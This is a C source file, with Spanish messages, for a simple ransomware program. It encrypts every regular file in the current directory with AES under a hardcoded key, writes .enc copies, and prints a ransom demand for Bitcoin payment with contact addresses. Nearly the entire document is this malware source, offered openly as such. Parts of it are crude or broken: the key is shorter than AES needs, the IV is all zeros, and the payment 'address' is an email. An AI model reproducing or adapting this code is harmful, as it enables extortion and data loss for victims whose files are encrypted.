#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <openssl/aes.h>
#include <dirent.h>

#define AES_BLOCK_SIZE 16
#define RANSOM_AMOUNT 10
#define RANSOM_ADDRESS "hanburgueza@tuqueso.com"

void handle_error(const char *msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

void aes_encrypt_file(const char *in_filename, const char *out_filename, const char *key) {
    FILE *in_file = fopen(in_filename, "rb");
    FILE *out_file = fopen(out_filename, "wb");

    if (!in_file || !out_file) {
        handle_error("Error al abrir el archivo.");
    }

    fseek(in_file, 0, SEEK_END);
    long file_size = ftell(in_file);
    rewind(in_file);

    unsigned char iv[AES_BLOCK_SIZE];
    memset(iv, 0x00, AES_BLOCK_SIZE);

    AES_KEY aes_key;
    if (AES_set_encrypt_key((const unsigned char *)key, 128, &aes_key) < 0) {
        handle_error("Error al establecer la clave de cifrado.");
    }

    fwrite(iv, 1, AES_BLOCK_SIZE, out_file);

    unsigned char in_data[AES_BLOCK_SIZE];
    unsigned char out_data[AES_BLOCK_SIZE];
    int num_bytes_read;

    while ((num_bytes_read = fread(in_data, 1, AES_BLOCK_SIZE, in_file)) > 0) {
        if (num_bytes_read < AES_BLOCK_SIZE) {
            memset(in_data + num_bytes_read, 0, AES_BLOCK_SIZE - num_bytes_read);
        }
        AES_cbc_encrypt(in_data, out_data, AES_BLOCK_SIZE, &aes_key, iv, AES_ENCRYPT);
        fwrite(out_data, 1, AES_BLOCK_SIZE, out_file);
    }

    fclose(in_file);
    fclose(out_file);
}

void ransom_message() {
    printf("¡Tus archivos han sido cifrados!\n");
    printf("Para recuperar tus archivos, debes pagar un rescate de $%d en Bitcoin a la siguiente dirección: %s.\n", RANSOM_AMOUNT, RANSOM_ADDRESS);
    printf("Una vez realizado el pago, envía la prueba de pago a ransomware@example.com y te proporcionaremos la clave para descifrar tus archivos.\n");
}

int main() {
    char key[] = "clave_secreta";
    DIR *dir;
    struct dirent *ent;

    if (!(dir = opendir("."))) {
        handle_error("Error al abrir el directorio.");
    }

    while ((ent = readdir(dir)) != NULL) {
        if (ent->d_type == DT_REG) { // Solo ciframos archivos regulares
            char encrypted_filename[256];
            snprintf(encrypted_filename, sizeof(encrypted_filename), "%s.enc", ent->d_name);
            aes_encrypt_file(ent->d_name, encrypted_filename, key);
        }
    }

    closedir(dir);

    // Mostramos el mensaje de rescate
    ransom_message();

    return 0;
}